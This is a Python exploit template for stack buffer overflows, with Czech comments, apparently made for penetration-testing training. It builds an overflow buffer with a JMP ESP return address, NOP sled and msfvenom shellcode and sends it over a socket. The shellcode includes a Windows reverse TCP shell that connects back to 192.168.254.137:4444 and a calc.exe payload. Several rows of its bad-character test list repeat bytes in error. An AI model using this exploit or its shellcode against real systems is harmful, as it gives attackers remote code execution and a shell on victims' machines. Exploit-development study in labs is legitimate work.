import socket 
import struct

#Udaje, ktere je potreba vyplnit
RHOST = ""                              # IP adresa zranitelne aplikace
RPORT = 1234                            # Port zranitelne aplikace
offset_srp = 146                        # Prostor kdy preteka buffer a dochazi k prepisu ESP a EIP registru
bufferTotalLength = 3000                # Variabilni hodnota. Je potreba zjistit maximalni velikost dokud se aplikace jeste nezhrouti
ptr_jmp_esp = 0x7659C92C                # Nalezena adresa pres imunity debugger, ktera bude vlozena do ESP registru. Na teto adrese se ocekava jmp instrukce - \xff\xe4
nop_sled_count = 20                     # Vyplneni prostoru pred shellcodem nop sledy, toto je zniceno. Elegantnejsi reseni bude pres sub_esp_10
send_buffer_prefix = b""                # Prikaz, ktery je potreba odeslat pred shellcodem, napr. VRFY, USR, ...
connection_receive_data_first = False   # Nastavit pokud se ocekava, ze proti strana odesila banner pri pripojeni.

#Nasledujici udaje neni potreba menit
rcv_data_buffer = 1024              
 
sub_esp_10 = "\x83\xec\x10"             # Zatim nevyuzito
nop_sled = b"\x90"                      # Vypln pred shellcodem
init_test_buffer_size = bufferTotalLength

#msf-pattern_create.rb -l 3000
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"
#msf-pattern_offset -q 39654138 -l 3000

badchars_verifed = [0x00, 0x0A]   #[0x00, 0x04, 0x0A, 0x32, 0x78, 0x91, 0xC1]

#msfvenom -p windows/exec -b '\x00\x04e\x0A\x32\x78\x91\xC1' -f python --var-name shellCode_Calc CMD=calc.exe EXITFUNC=thread
shellCode_Calc =  b""
shellCode_Calc += b"\x31\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff"
shellCode_Calc += b"\xc0\x5e\x81\x76\x0e\xb6\x1b\x94\xc4\x83"
shellCode_Calc += b"\xee\xfc\xe2\xf4\x4a\xf3\x16\xc4\xb6\x1b"
shellCode_Calc += b"\xf4\x4d\x53\x2a\x54\xa0\x3d\x4b\xa4\x4f"
shellCode_Calc += b"\xe4\x17\x1f\x96\xa2\x90\xe6\xec\xb9\xac"
shellCode_Calc += b"\xde\xe2\x87\xe4\x38\xf8\xd7\x67\x96\xe8"
shellCode_Calc += b"\x96\xda\x5b\xc9\xb7\xdc\x76\x36\xe4\x4c"
shellCode_Calc += b"\x1f\x96\xa6\x90\xde\xf8\x3d\x57\x85\xbc"
shellCode_Calc += b"\x55\x53\x95\x15\xe7\x90\xcd\xe4\xb7\xc8"
shellCode_Calc += b"\x1f\x8d\xae\xf8\xae\x8d\x3d\x2f\x1f\xc5"
shellCode_Calc += b"\x60\x2a\x6b\x68\x77\xd4\x99\xc5\x71\x23"
shellCode_Calc += b"\x74\xb1\x40\x18\xe9\x3c\x8d\x66\xb0\xb1"
shellCode_Calc += b"\x52\x43\x1f\x9c\x92\x1a\x47\xa2\x3d\x17"
shellCode_Calc += b"\xdf\x4f\xee\x07\x95\x17\x3d\x1f\x1f\xc5"
shellCode_Calc += b"\x66\x92\xd0\xe0\x92\x40\xcf\xa5\xef\x41"
shellCode_Calc += b"\xc5\x3b\x56\x44\xcb\x9e\x3d\x09\x7f\x49"
shellCode_Calc += b"\xeb\x71\x95\x49\x33\xa9\x94\xc4\xb6\x4b"
shellCode_Calc += b"\xfc\xf5\x3d\x74\x13\x3b\x63\xa0\x74\xd9"
shellCode_Calc += b"\x9c\x11\xfc\x62\x23\xa6\x09\x3b\x63\x27"
shellCode_Calc += b"\x92\xb8\xbc\x9b\x6f\x24\xc3\x1e\x2f\x83"
shellCode_Calc += b"\xa5\x69\xfb\xae\xb6\x48\x6b\x11\xd5\x7a"
shellCode_Calc += b"\xf8\xa7\x98\x7e\xec\xa1\xb6\x1b\x94\xc4"

#msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A' -f python --var-name shellCode_ReverseTcp LHOST=192.168.254.137 LPORT=4444 EXITFUNC=thread
shellCode_ReverseTcp =  b""
shellCode_ReverseTcp += b"\xbb\x0f\x84\x7c\xc1\xda\xda\xd9\x74"
shellCode_ReverseTcp += b"\x24\xf4\x5a\x31\xc9\xb1\x52\x83\xc2"
shellCode_ReverseTcp += b"\x04\x31\x5a\x0e\x03\x55\x8a\x9e\x34"
shellCode_ReverseTcp += b"\x95\x7a\xdc\xb7\x65\x7b\x81\x3e\x80"
shellCode_ReverseTcp += b"\x4a\x81\x25\xc1\xfd\x31\x2d\x87\xf1"
shellCode_ReverseTcp += b"\xba\x63\x33\x81\xcf\xab\x34\x22\x65"
shellCode_ReverseTcp += b"\x8a\x7b\xb3\xd6\xee\x1a\x37\x25\x23"
shellCode_ReverseTcp += b"\xfc\x06\xe6\x36\xfd\x4f\x1b\xba\xaf"
shellCode_ReverseTcp += b"\x18\x57\x69\x5f\x2c\x2d\xb2\xd4\x7e"
shellCode_ReverseTcp += b"\xa3\xb2\x09\x36\xc2\x93\x9c\x4c\x9d"
shellCode_ReverseTcp += b"\x33\x1f\x80\x95\x7d\x07\xc5\x90\x34"
shellCode_ReverseTcp += b"\xbc\x3d\x6e\xc7\x14\x0c\x8f\x64\x59"
shellCode_ReverseTcp += b"\xa0\x62\x74\x9e\x07\x9d\x03\xd6\x7b"
shellCode_ReverseTcp += b"\x20\x14\x2d\x01\xfe\x91\xb5\xa1\x75"
shellCode_ReverseTcp += b"\x01\x11\x53\x59\xd4\xd2\x5f\x16\x92"
shellCode_ReverseTcp += b"\xbc\x43\xa9\x77\xb7\x78\x22\x76\x17"
shellCode_ReverseTcp += b"\x09\x70\x5d\xb3\x51\x22\xfc\xe2\x3f"
shellCode_ReverseTcp += b"\x85\x01\xf4\x9f\x7a\xa4\x7f\x0d\x6e"
shellCode_ReverseTcp += b"\xd5\x22\x5a\x43\xd4\xdc\x9a\xcb\x6f"
shellCode_ReverseTcp += b"\xaf\xa8\x54\xc4\x27\x81\x1d\xc2\xb0"
shellCode_ReverseTcp += b"\xe6\x37\xb2\x2e\x19\xb8\xc3\x67\xde"
shellCode_ReverseTcp += b"\xec\x93\x1f\xf7\x8c\x7f\xdf\xf8\x58"
shellCode_ReverseTcp += b"\x2f\x8f\x56\x33\x90\x7f\x17\xe3\x78"
shellCode_ReverseTcp += b"\x95\x98\xdc\x99\x96\x72\x75\x33\x6d"
shellCode_ReverseTcp += b"\x15\xba\x6c\x93\x6c\x52\x6f\x6b\x7e"
shellCode_ReverseTcp += b"\xff\xe6\x8d\xea\xef\xae\x06\x83\x96"
shellCode_ReverseTcp += b"\xea\xdc\x32\x56\x21\x99\x75\xdc\xc6"
shellCode_ReverseTcp += b"\x5e\x3b\x15\xa2\x4c\xac\xd5\xf9\x2e"
shellCode_ReverseTcp += b"\x7b\xe9\xd7\x46\xe7\x78\xbc\x96\x6e"
shellCode_ReverseTcp += b"\x61\x6b\xc1\x27\x57\x62\x87\xd5\xce"
shellCode_ReverseTcp += b"\xdc\xb5\x27\x96\x27\x7d\xfc\x6b\xa9"
shellCode_ReverseTcp += b"\x7c\x71\xd7\x8d\x6e\x4f\xd8\x89\xda"
shellCode_ReverseTcp += b"\x1f\x8f\x47\xb4\xd9\x79\x26\x6e\xb0"
shellCode_ReverseTcp += b"\xd6\xe0\xe6\x45\x15\x33\x70\x4a\x70"
shellCode_ReverseTcp += b"\xc5\x9c\xfb\x2d\x90\xa3\x34\xba\x14"
shellCode_ReverseTcp += b"\xdc\x28\x5a\xda\x37\xe9\x7a\x39\x9d"
shellCode_ReverseTcp += b"\x04\x13\xe4\x74\xa5\x7e\x17\xa3\xea"
shellCode_ReverseTcp += b"\x86\x94\x41\x93\x7c\x84\x20\x96\x39"
shellCode_ReverseTcp += b"\x02\xd9\xea\x52\xe7\xdd\x59\x52\x22"

def get_badcharList():
    tmp_badchars_test_list =  b""
    tmp_badchars_test_list += b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F"
    tmp_badchars_test_list += b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F"
    tmp_badchars_test_list += b"\x20\x21\x22\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F"
    tmp_badchars_test_list += b"\x30\x31\x32\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F"
    tmp_badchars_test_list += b"\x40\x41\x42\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F"
    tmp_badchars_test_list += b"\x50\x51\x52\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F"
    tmp_badchars_test_list += b"\x60\x61\x62\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F"
    tmp_badchars_test_list += b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F"
    tmp_badchars_test_list += b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F"
    tmp_badchars_test_list += b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F"
    tmp_badchars_test_list += b"\xA0\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF"
    tmp_badchars_test_list += b"\xB0\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF"
    tmp_badchars_test_list += b"\xC0\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF"
    tmp_badchars_test_list += b"\xD0\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF"
    tmp_badchars_test_list += b"\xE0\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF"
    tmp_badchars_test_list += b"\xF0\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF"
    return tmp_badchars_test_list

    #tmp_badchars_test_list = b""
    #for i in range(0x00, 0xFF+1): 
    #    if i not in badchars_verifed: 
    #        tmp_badchars_test_list += chr(i).encode('utf-8')
    #return tmp_badchars_test_list

def get_OverFlowBuffer():
    tmpBuf = b"" 
    tmpBuf += b"A"*(offset_srp-len(tmpBuf))                 # osazeni - vyplneni volneho mista v zasobniku pred pretecenim.
    tmpBuf += struct.pack("<I", ptr_jmp_esp)                # SRP overwrite    #zmena big endian a little endian
    tmpBuf += nop_sled*nop_sled_count
    ###tmpBuf += sub_esp_10                                 #alternativa k nop sleds
    tmpBuf += shellCode_ReverseTcp
    tmpBuf += b"D"*(bufferTotalLength - len(tmpBuf))        # odsazeni nakonec - vyplneni nepotrebneho mista
    return tmpBuf

def get_InitTestBufferPart1():
    tmpBuf = b""
    tmpBuf += b"A"*init_test_buffer_size
    #tmpBuf += b"B"*4 
    #tmpBuf += badchar_test
    return tmpBuf

def get_PatternTestBuffer():
    tmpBuf = b""
    tmpBuf += pattern
    return tmpBuf

def get_InitTestBufferPart2():
    tmpBuf = b""
    tmpBuf += b"A"*(offset_srp-len(tmpBuf)) # padding
    tmpBuf += b"B"*4
    return tmpBuf

def get_BadcharBuffer():
    tmpBuf = b""
    tmpBuf += b"A"*(offset_srp-len(tmpBuf))
    tmpBuf += b"B"*4
    tmpBuf += get_badcharList()
    tmpBuf += b"D"*(bufferTotalLength - len(tmpBuf))
    return tmpBuf

def send_buffer(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    try: 
        s.connect((RHOST, RPORT))    
        print("Connected to: {0}:{1}".format(RHOST, RPORT))

        if connection_receive_data_first:
            rcvData = s.recv(rcv_data_buffer)  
            print("Received {0}".format(rcvData))
        
        #s.send('OVRFLW ' + buf + '\r\n') 
        s.send(send_buffer_prefix + buffer + b'\r\n')
        rcvData = s.recv(rcv_data_buffer) 
        print("Received {0}".format(rcvData))
    finally: 
        s.close() 
        print("Disconnected from {0}:{1}".format(RHOST, RPORT))